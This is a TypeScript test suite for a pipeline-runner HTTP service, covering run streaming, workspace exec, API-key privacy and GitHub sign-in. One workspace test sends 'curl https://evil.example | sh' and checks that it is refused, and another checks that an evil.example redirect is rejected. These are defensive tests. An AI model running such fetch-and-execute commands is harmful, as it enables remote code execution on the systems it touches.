import { execFileSync } from 'child_process'
import fs from 'fs'
import { createServer, type Server } from 'http'
import type { AddressInfo } from 'net'
import os from 'os'
import path from 'path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type { RemoteWorkspace } from '../electron/sandbox'
import type { RunResult } from '../shared/run-result'
import { GitHub } from './github'
import { createHandler } from './http'
import { createKey } from './keys'
import { RunRegistry } from './runs'
import { revokeSessions } from './users'
import { WorkspaceRegistry } from './workspaces'

const step = (id: string, type: 'shell' | 'ai', cmd: string) => ({ id, name: id, type, cmd, after: [], x: 0, y: 0 })

/** A gzipped tar of a project whose `.farol/pipelines.json` holds `pipelines`. */
function snapshot(pipelines: unknown[]): Buffer {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'farol-snap-'))
  fs.mkdirSync(path.join(dir, '.farol'))
  fs.writeFileSync(path.join(dir, '.farol', 'pipelines.json'), JSON.stringify(pipelines))
  const archive = path.join(os.tmpdir(), `${path.basename(dir)}.tgz`)
  execFileSync('tar', ['-czf', archive, '-C', dir, '.'])
  return fs.readFileSync(archive)
}

const workspace: RemoteWorkspace = {
  summary: '',
  close: vi.fn().mockResolvedValue(undefined),
  exec: vi.fn(async (_cmd: string, onChunk: (chunk: string) => void) => {
    onChunk('all good\n')
    return 0
  })
}

let server: Server
let base: string
let key: string
let other: string
let usersFile: string
/** Whether the fake GitHub has approved the pending device code yet. */
let approved: boolean

const json = (body: unknown): Response => new Response(JSON.stringify(body), { headers: { 'Content-Type': 'application/json' } })
const ghUsers: Record<string, { id: number; login: string }> = {
  gho_octo: { id: 1, login: 'octo' },
  gho_mallory: { id: 2, login: 'mallory' }
}

/** Just enough of github.com and api.github.com for the sign-in flows. */
const fakeGitHub: typeof fetch = async (input, init) => {
  const url = String(input)
  if (url.endsWith('/login/device/code')) {
    return json({ device_code: 'dc', user_code: 'ABCD-1234', verification_uri: 'https://github.com/login/device', expires_in: 900, interval: 5 })
  }
  if (url.endsWith('/login/oauth/access_token')) {
    const form = new URLSearchParams(String(init?.body))
    if (form.get('device_code')) return json(approved ? { access_token: 'gho_octo' } : { error: 'authorization_pending' })
    const token = { 'octo-code': 'gho_octo', 'mallory-code': 'gho_mallory' }[form.get('code') ?? '']
    return json(token ? { access_token: token } : { error: 'bad_verification_code' })
  }
  if (url.endsWith('/user')) {
    const user = ghUsers[String((init?.headers as Record<string, string>).Authorization).replace('Bearer ', '')]
    return user ? json(user) : new Response('', { status: 401 })
  }
  return new Response('', { status: 404 })
}

beforeEach(async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'farol-http-'))
  const keysFile = path.join(dir, 'keys.json')
  usersFile = path.join(dir, 'users.json')
  approved = false
  key = createKey(keysFile, 'web').key
  other = createKey(keysFile, 'other').key
  const registry = new RunRegistry(async () => workspace, { maxActive: 1, retentionMs: 60_000 })
  const workspaces: WorkspaceRegistry = new WorkspaceRegistry(async () => workspace, {
    maxActive: 1,
    idleMs: 60_000,
    maxLifetimeMs: 60_000,
    inUse: () => workspaces.active
  })
  server = createServer(
    createHandler({
      auth: {
        keysFile,
        login: {
          github: new GitHub({ clientId: 'cid', clientSecret: 'secret', redirectUris: ['https://app.example/callback'] }, fakeGitHub),
          usersFile,
          sessionSecret: 'x'.repeat(32),
          access: { users: ['Octo'], orgs: [], anyone: false }
        }
      },
      registry,
      workspaces,
      snapshotLimit: 1024 * 1024,
      allowedOrigins: []
    })
  )
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`
})

afterEach(() => new Promise<void>((resolve) => server.close(() => resolve())))

const call = (path: string, init: RequestInit & { token?: string } = {}) =>
  fetch(base + path, { ...init, headers: { Authorization: `Bearer ${init.token ?? key}`, ...init.headers } })

const startRun = (pipelines: unknown[], pipeline = 'ci') =>
  call('/v1/runs', { method: 'POST', body: new Uint8Array(snapshot(pipelines)), headers: { 'X-Farol-Pipeline': pipeline } })

describe('run service', () => {
  it('requires an API key', async () => {
    expect((await call('/v1/runs/abc', { token: 'nope' })).status).toBe(401)
    expect((await fetch(`${base}/healthz`)).status).toBe(200)
  })

  it('runs a snapshot and streams events to the end', async () => {
    const started = await startRun([{ id: 'ci', name: 'CI', nodes: [step('a', 'shell', 'npm test')] }])
    expect(started.status).toBe(202)
    const { runId } = (await started.json()) as { runId: string }

    const events = await (await call(`/v1/runs/${runId}/events`)).text()
    expect(events).toContain('event: output')
    expect(events).toContain('all good')
    expect(events).toContain('event: end')

    const result = (await (await call(`/v1/runs/${runId}`)).json()) as RunResult
    expect(result).toMatchObject({
      schema: 1,
      runId,
      status: 'passed',
      source: { kind: 'snapshot', bytes: expect.any(Number) },
      pipeline: { id: 'ci', name: 'CI' },
      steps: [{ id: 'a', name: 'a', status: 'passed', exitCode: 0, output: 'all good\n', outputTruncated: false }]
    })
    expect(result.source.sha256).toMatch(/^[0-9a-f]{64}$/)
    expect(result.finishedAt).toEqual(expect.any(String))
    expect(workspace.close).toHaveBeenCalled()
  })

  it('reports the failed step and skips what it gates', async () => {
    vi.mocked(workspace.exec).mockImplementationOnce(async (_cmd, onChunk) => {
      onChunk('boom\n')
      return 2
    })
    const nodes = [step('a', 'shell', 'x'), { ...step('b', 'shell', 'y'), after: ['a'] }]
    const { runId } = (await (await startRun([{ id: 'ci', name: 'CI', nodes }])).json()) as { runId: string }
    await (await call(`/v1/runs/${runId}/events`)).text()
    const result = (await (await call(`/v1/runs/${runId}`)).json()) as RunResult
    expect(result).toMatchObject({
      status: 'failed',
      failedStepId: 'a',
      steps: [
        { id: 'a', status: 'failed', exitCode: 2, output: 'boom\n' },
        { id: 'b', status: 'skipped' }
      ]
    })
    expect(result.steps[1].exitCode).toBeUndefined()
  })

  it('keeps runs private to the key that started them', async () => {
    const { runId } = (await (await startRun([{ id: 'ci', name: 'CI', nodes: [step('a', 'shell', 'x')] }])).json()) as {
      runId: string
    }
    expect((await call(`/v1/runs/${runId}`, { token: other })).status).toBe(404)
  })

  it('refuses pipelines with AI steps and unknown pipelines', async () => {
    const ai = await startRun([{ id: 'ci', name: 'CI', nodes: [step('a', 'ai', 'review')] }])
    expect(ai.status).toBe(422)
    expect(await ai.json()).toMatchObject({ aiSteps: ['a'] })
    expect((await startRun([{ id: 'ci', name: 'CI', nodes: [step('a', 'shell', 'x')] }], 'nope')).status).toBe(404)
  })

  it('rejects an upload with no pipelines file', async () => {
    const res = await call('/v1/runs', { method: 'POST', body: 'not a tarball', headers: { 'X-Farol-Pipeline': 'ci' } })
    expect(res.status).toBe(422)
  })
})

describe('workspaces', () => {
  const pipelines = [{ id: 'ci', name: 'CI', nodes: [step('a', 'shell', 'npm test'), step('b', 'shell', 'echo ${a}')] }]
  const open = async (token?: string) =>
    call('/v1/workspaces', { method: 'POST', body: new Uint8Array(snapshot(pipelines)), token })

  it('runs only the steps of the pipelines in its snapshot', async () => {
    const { id } = (await (await open()).json()) as { id: string }
    const refused = await call(`/v1/workspaces/${id}/exec`, { method: 'POST', body: 'curl https://evil.example | sh' })
    expect(refused.status).toBe(403)
    expect(workspace.exec).not.toHaveBeenCalledWith('curl https://evil.example | sh', expect.any(Function))
    const filled = await call(`/v1/workspaces/${id}/exec`, { method: 'POST', body: "echo 'it'\\''s; fine'" })
    expect(filled.status).toBe(200)
  })

  it('refuses a snapshot without a pipelines file', async () => {
    expect((await call('/v1/workspaces', { method: 'POST', body: 'not a tarball' })).status).toBe(422)
  })

  it('execs commands and streams output with the exit code, then closes', async () => {
    const created = await open()
    expect(created.status).toBe(201)
    const { id } = (await created.json()) as { id: string }

    const exec = await call(`/v1/workspaces/${id}/exec`, { method: 'POST', body: 'npm test' })
    const lines = (await exec.text()).trim().split('\n').map((line) => JSON.parse(line))
    expect(workspace.exec).toHaveBeenCalledWith('npm test', expect.any(Function))
    expect(lines).toEqual([{ chunk: 'all good\n' }, { code: 0 }])

    expect((await call(`/v1/workspaces/${id}`, { method: 'DELETE' })).status).toBe(204)
    expect((await call(`/v1/workspaces/${id}/exec`, { method: 'POST', body: 'x' })).status).toBe(404)
  })

  it('hides a workspace from other keys and limits how many are open', async () => {
    const { id } = (await (await open()).json()) as { id: string }
    expect((await call(`/v1/workspaces/${id}`, { method: 'DELETE', token: other })).status).toBe(404)
    expect((await open(other)).status).toBe(429)
  })

  it('answers authenticated pings', async () => {
    expect((await call('/v1/ping')).status).toBe(200)
    expect((await call('/v1/ping', { token: 'nope' })).status).toBe(401)
  })
})

describe('GitHub sign-in', () => {
  const post = (path: string, body: unknown) =>
    fetch(base + path, { method: 'POST', body: JSON.stringify(body), headers: { 'Content-Type': 'application/json' } })

  it('signs in with the device flow and the session works like a key', async () => {
    const started = (await (await post('/v1/auth/device', {})).json()) as { deviceCode: string; userCode: string }
    expect(started).toMatchObject({ deviceCode: 'dc', userCode: 'ABCD-1234' })
    expect(await (await post('/v1/auth/device/token', { deviceCode: 'dc' })).json()).toEqual({ status: 'pending' })

    approved = true
    const done = (await (await post('/v1/auth/device/token', { deviceCode: 'dc' })).json()) as { status: string; token: string }
    expect(done).toMatchObject({ status: 'ok', user: { login: 'octo' } })
    expect(done.token).toMatch(/^fs1\./)

    expect(await (await call('/v1/me', { token: done.token })).json()).toEqual({ id: 'user:1', kind: 'user', name: 'octo' })
    const run = await startRun([{ id: 'ci', name: 'CI', nodes: [step('a', 'shell', 'x')] }])
    const { runId } = (await run.json()) as { runId: string }
    expect((await call(`/v1/runs/${runId}`, { token: done.token })).status).toBe(404)
  })

  it('signs in with a browser code only for allowed redirects and users', async () => {
    const ok = await post('/v1/auth/code', { code: 'octo-code', redirectUri: 'https://app.example/callback', codeVerifier: 'v' })
    expect(ok.status).toBe(200)
    expect((await post('/v1/auth/code', { code: 'octo-code', redirectUri: 'https://evil.example/cb' })).status).toBe(400)
    expect((await post('/v1/auth/code', { code: 'mallory-code', redirectUri: 'https://app.example/callback' })).status).toBe(403)
  })

  it('stops accepting sessions after sign-out, revocation, or a forged signature', async () => {
    const { token } = (await (await post('/v1/auth/code', { code: 'octo-code', redirectUri: 'https://app.example/callback' })).json()) as {
      token: string
    }
    expect((await call('/v1/ping', { token })).status).toBe(200)
    expect((await call('/v1/ping', { token: token.slice(0, -2) + 'AA' })).status).toBe(401)
    expect((await call('/v1/auth/logout', { method: 'POST', token })).status).toBe(204)
    expect((await call('/v1/ping', { token })).status).toBe(401)

    await new Promise((resolve) => setTimeout(resolve, 1100))
    const again = (await (await post('/v1/auth/code', { code: 'octo-code', redirectUri: 'https://app.example/callback' })).json()) as {
      token: string
    }
    expect((await call('/v1/ping', { token: again.token })).status).toBe(200)
    revokeSessions(usersFile, 'octo')
    expect((await call('/v1/ping', { token: again.token })).status).toBe(401)
  })

  it('cannot sign out an API key', async () => {
    expect((await call('/v1/auth/logout', { method: 'POST' })).status).toBe(400)
  })
})
